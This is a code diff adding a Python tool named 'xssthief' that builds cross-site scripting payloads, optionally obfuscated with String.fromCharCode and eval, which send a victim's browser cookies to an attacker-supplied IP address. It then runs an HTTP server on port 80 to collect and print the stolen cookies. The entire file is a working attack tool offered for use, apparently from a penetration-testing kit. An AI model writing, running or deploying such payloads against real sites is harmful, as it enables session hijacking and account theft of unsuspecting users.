@@ -1,0 +1,56 @@
+#!/usr/bin/python3
+
+import argparse
+import os
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import parse_qs
+
+parser = argparse.ArgumentParser(description='creates xss payloads and starts http server to collect cookies', epilog='xssthief 10.10.10.50' + '\n' + 'xssthief 10.10.10.50 --obfuscated', formatter_class=argparse.RawTextHelpFormatter)
+parser.add_argument('lhost', help='ip address of listening host')
+parser.add_argument('-o', '--obfuscated', action='store_true', help='create obfuscated payload')
+args = parser.parse_args()
+
+lhost = args.lhost
+
+class handler(BaseHTTPRequestHandler):
+        def do_GET(self):
+                qs = {}
+                path = self.path
+                if '?' in path:
+                        path, temp = path.split('?', 1)
+                        qs = parse_qs(temp)
+                print(qs)
+
+def serve():
+        print('Starting server, press Ctrl+C to exit...\n')
+        address = (lhost, 80)
+        httpd = HTTPServer(address, handler)
+        try:
+                httpd.serve_forever()
+        except KeyboardInterrupt:
+                httpd.server_close()
+                print('\nBye!')
+
+def obfuscate():
+        js = '''document.write('<img src=x onerror=this.src="http://''' + lhost + '''/?cookie="+encodeURI(document.getElementsByName("cookie")[0].value)>');'''
+        ords = ','.join([str(ord(c)) for c in js])
+        payload = '<img src="/><script>eval(String.fromCharCode(' + ords + '))</script>" />'
+        return payload
+
+def norm_payload():
+        xss = '''<img src=x onerror=this.src='http://''' + lhost + '''/?cookie='+document.cookie>'''
+        print('[*] Your payload: ' + xss + '\n')
+        serve()
+
+def obs_payload():
+        xss =obfuscate()
+        print('[*] Your payload: ' + xss + '\n')
+        serve()
+
+def main():
+        if args.obfuscated:
+                obs_payload()
+        else:
+                norm_payload()
+
+main()
